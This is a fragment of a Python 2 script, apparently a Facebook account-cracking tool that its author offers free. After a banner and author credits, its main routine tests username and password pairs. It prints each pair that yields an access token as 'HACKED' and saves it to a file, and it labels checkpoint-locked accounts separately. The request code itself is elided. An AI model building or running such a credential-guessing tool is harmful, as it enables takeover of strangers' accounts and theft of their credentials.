#Tools Created By Mohammad Sumon Ahmed 
#RED GAMING YT
...
print("\033[0;91mThis Tool's Free By Mohammad Sumon Ahmed")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Mohammad Sumon Ahmed'
    print '\033[0;94mFACEBOOK : Mohammad Sumon Ahmed'
    print '\033[0;96mGITHUB   : MohammadSumonAhmed'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Sumon-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Sumon-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
